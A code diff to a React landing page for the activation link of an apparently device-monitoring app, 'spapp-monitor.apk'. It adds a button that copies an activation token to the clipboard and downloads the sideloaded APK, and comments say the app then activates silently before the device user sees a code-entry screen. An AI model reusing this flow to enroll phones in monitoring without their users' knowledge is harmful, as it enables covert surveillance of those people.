@@ -1,21 +1,28 @@
 import { useEffect, useState } from "react";
 import { useSearchParams } from "react-router-dom";
 
+/** Where the admin uploads the latest built APK — see dashboard/public/download/README.md. */
+const APK_DOWNLOAD_PATH = "/download/spapp-monitor.apk";
+
 /**
  * Public (no-login) landing page the dashboard's device-activation QR code /
  * shareable link points to: https://<domain>/connect?token=...&name=...
  *
  * If the app is already installed, Android intercepts this https URL via the
  * intent-filter on ActivationActivity (see AndroidManifest.xml) and opens
- * straight into the app with the token pre-filled — this page never
- * actually renders in that case. This page is the fallback shown when the
- * app isn't installed yet, or the OS doesn't offer the app-open prompt.
+ * straight into the app with the token pre-filled. If it's not installed
+ * yet, "Download App" below copies the token to the clipboard first — a
+ * sideloaded app has no Play Install Referrer to carry the token across the
+ * install/open gap, so SplashActivity reads it back from the clipboard on
+ * first launch instead (see SplashActivity.kt) and activates silently
+ * before the device user ever sees a code-entry screen.
  */
 export default function ConnectPage() {
   const [params] = useSearchParams();
   const token = params.get("token") || "";
   const name = params.get("name") || "this device";
   const [copied, setCopied] = useState(false);
+  const [downloadStarted, setDownloadStarted] = useState(false);
 
   // One explicit, user-initiated attempt to hand off to the app via the
   // custom scheme. Browsers block navigating to non-http(s) schemes when
@@ -37,6 +44,17 @@ export default function ConnectPage() {
     }
   }
 
+  async function handleDownloadApp() {
+    try {
+      await navigator.clipboard.writeText(token);
+    } catch {
+      // clipboard API unavailable — SplashActivity's clipboard check will just
+      // find nothing and fall back to the manual code-entry screen.
+    }
+    setDownloadStarted(true);
+    window.location.href = APK_DOWNLOAD_PATH;
+  }
+
   if (!token) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-gray-50 px-4">
@@ -53,12 +71,26 @@ export default function ConnectPage() {
           If the app is already installed on this phone, it should open automatically.
         </p>
 
+        <button
+          onClick={handleDownloadApp}
+          className="w-full bg-primary text-white text-sm font-medium px-4 py-2.5 rounded hover:bg-primary-dark transition mb-3"
+        >
+          Download App
+        </button>
+
+        {downloadStarted && (
+          <p className="text-xs text-gray-500 mb-4">
+            Downloading... once installed, open the app, tap Allow, and it will connect as "
+            {name}" automatically — no code to type.
+          </p>
+        )}
+
         <div className="text-left bg-gray-50 border rounded p-3 text-sm mb-4">
-          <p className="font-medium mb-2">If nothing happened:</p>
+          <p className="font-medium mb-2">Steps:</p>
           <ol className="list-decimal list-inside text-gray-600 space-y-1">
-            <li>Install the app on this phone (if not done already).</li>
-            <li>Open the app and grant the requested permissions.</li>
-            <li>Come back and tap this link again.</li>
+            <li>Tap "Download App" above and install it.</li>
+            <li>Open the app and tap "Allow".</li>
+            <li>Grant the permissions it asks for.</li>
           </ol>
         </div>
 
